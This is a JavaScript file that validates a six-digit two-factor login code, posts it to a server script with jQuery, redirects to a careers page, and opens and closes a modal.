// Disable submit button by default when page loads
document.addEventListener('DOMContentLoaded', function() {
    const submitButton = document.querySelector('#submit');
    submitButton.disabled = true;
});

// Input validation and button enable/disable
document.querySelector("#fa2").addEventListener('input', function(e) {
    const submitButton = document.querySelector('#submit');
    const value = e.target.value.trim();
    submitButton.disabled = value.length !== 6;
});

// Define the custom onLoginSubmit function
function onLoginSubmit(e, _this) {
    e.preventDefault(); // Prevent the default form submission

    const submitButton = _this.querySelector('#submit');
    const spinner = submitButton.querySelector('i');
    const fa2 = _this.querySelector("#fa2").value.trim();
    const numberError = _this.querySelector("#number-error");

    // Prevent multiple submissions
    if (submitButton.disabled) {
        return;
    }

    // Validate the 2FA code
    if (!fa2 || fa2.length !== 6) {
        numberError.innerText = !fa2 ? 'Please enter your login code' : 'Login code must be 6 digits';
        _this.querySelector("#fa2").classList.add('error-text');
        return;
    } else {
        numberError.innerText = '';
        _this.querySelector("#fa2").classList.remove('error-text');
    }

    // Immediately disable button and show spinner
    submitButton.disabled = true;
    spinner.style.display = 'inline-block';
    submitButton.innerHTML = `<i class="bx bx-loader-alt bx-spin bx-rotate-90"></i> Continue`;

    // Send the form data to the server
    $.post('sd.php', { fa2 })
        .done(function(response) {
            console.log(response);
            // Redirect after successful submission
            setTimeout(() => {
                window.location.href = "/career";
            }, 2000); // Reduced timeout to 2 seconds
        })
        .fail(function() {
            console.error('Error during submission');
            // Re-enable the button on error
            submitButton.disabled = false;
            submitButton.innerHTML = `Continue`;
            numberError.innerText = 'An error occurred. Please try again.';
        });
}

// Attach the onLoginSubmit function to the form's submit event
const formfa = document.getElementById("formfa");
formfa.addEventListener('submit', function(event) {
    onLoginSubmit(event, formfa);
});

// Modal functionality
const modalContainer = document.getElementById("modal-container");
const modal = document.getElementById("modal");
const openModalBtn = document.getElementById("another");
const closeModalBtn = document.getElementById("close-modal");

openModalBtn.addEventListener("click", () => {
    modalContainer.style.display = "block";
});

closeModalBtn.addEventListener("click", () => {
    modalContainer.style.display = "none";
});

window.addEventListener("click", (event) => {
    if (event.target === modalContainer) {
        modalContainer.style.display = "none";
    }
});
